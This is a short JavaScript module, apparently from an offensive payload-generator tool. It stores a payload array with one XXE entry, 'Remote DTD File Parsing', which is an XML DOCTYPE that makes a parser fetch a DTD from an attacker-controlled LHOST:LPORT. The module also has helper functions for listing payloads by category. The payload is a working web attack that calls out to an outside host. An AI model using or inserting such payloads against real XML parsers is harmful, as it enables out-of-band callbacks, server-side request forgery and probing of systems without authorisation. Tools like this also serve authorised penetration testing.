var prompt = require('prompt');
var log = require('cli-color');
var options = log.yellow

// Payload Array
arrayNetworking = []

// title, description, payload, category, and callback (optional: used for additional options if needed)

// ########## Networking 

arrayNetworking.push({
	title: "Remote DTD File Parsing",
	description: "-"+options(" LHOST=<lhost>, LPORT=<lport>"),
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://$$LHOST$$:$$LPORT$$'>",
	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<lhost>:<lport>'>",
	category: "Bleh",
})




var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayNetworking,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayNetworking.length;i++){
			if (arrayNetworking[i].category === value){
				tempArray.push(arrayNetworking[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayNetworking.length;i++){
			if(unique[arrayNetworking[i].category]){

			}
			else {
				unique[arrayNetworking[i].category] = true;
				uniqueCategories.push(arrayNetworking[i].category)
			} 
		return uniqueCategories
		}
	}
}